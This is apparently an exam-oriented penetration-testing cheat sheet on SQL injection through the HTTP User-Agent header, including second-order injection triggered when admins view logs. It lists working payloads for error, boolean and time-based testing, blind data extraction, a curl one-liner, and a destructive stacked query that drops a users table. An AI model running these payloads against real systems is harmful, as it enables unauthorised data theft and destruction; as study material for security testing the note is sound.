## Advanced Injection Attacks — SQL Injection via User-Agent Header

## Objective
Exploit SQL injection in HTTP headers (User-Agent) to:
- Inject payloads into backend queries
- Trigger second-order SQLi
- Extract or manipulate data

Think: *“Is the server storing or using my headers in SQL queries?”*

---

## 1. Why User-Agent?

- Often logged in database
- Sometimes used in analytics / dashboards
- Rarely validated or sanitized

→ High chance of blind / second-order SQLi

---

## 2. Where It Happens

- Logging systems
- Admin panels (log viewers)
- Analytics dashboards
- Security monitoring tools

---

## 3. Injection Point

```http
User-Agent: Mozilla/5.0
```

→ Replace with payload:

```http
User-Agent: ' OR 1=1--
```

---

## 4. Basic Testing

### A. Error-based test

```http
User-Agent: '
```

→ Check for:
- errors
- broken pages (especially in admin/log views)

---

### B. Boolean test

```http
User-Agent: ' AND 1=1--
User-Agent: ' AND 1=2--
```

→ Observe differences later

---

### C. Time-based test

```http
User-Agent: ' OR SLEEP(5)--
```

→ Delayed response or delayed log processing

---

## 5. Second-Order SQL Injection

### Flow

1. Send payload in header:

```http
User-Agent: admin'--
```

2. Server stores it in DB

3. Admin views logs

4. Payload executed in backend query

---

### Example scenario

```sql
SELECT * FROM logs WHERE user_agent = '<input>'
```

→ Injection triggered when queried

---

## 6. Exploitation

### A. Data extraction (blind)

```http
User-Agent: ' AND substring(database(),1,1)='a'--
```

---

### B. Time-based extraction

```http
User-Agent: ' AND IF(1=1, SLEEP(5), 0)--
```

---

### C. Stacked queries (if supported)

```http
User-Agent: '; DROP TABLE users--
```

---

## 7. Detection Strategy

1. Send payload in User-Agent
2. Trigger feature that uses logs:
   - admin panel
   - analytics page
3. Observe:
   - errors
   - delays
   - unusual behavior

---

## 8. Tools

- Burp Suite (Proxy / Repeater)
- curl

```bash
curl -H "User-Agent: ' OR 1=1--" http://target.com
```

---

## 9. Indicators of Vulnerability

- Errors when viewing logs
- Delays in admin panel
- Unexpected data behavior
- Stored payload execution

---

## 10. Fast Workflow (Exam Mode)

1. Inject payload in User-Agent
2. Browse application normally
3. Access log-related features (if possible)
4. Test:
   - error-based
   - boolean-based
   - time-based
5. Confirm second-order execution

---

## 11. Mental Model

Headers are trusted input.

But they:
- Get stored
- Get reused

Your job:
→ Inject now → Trigger later  
→ Exploit indirect execution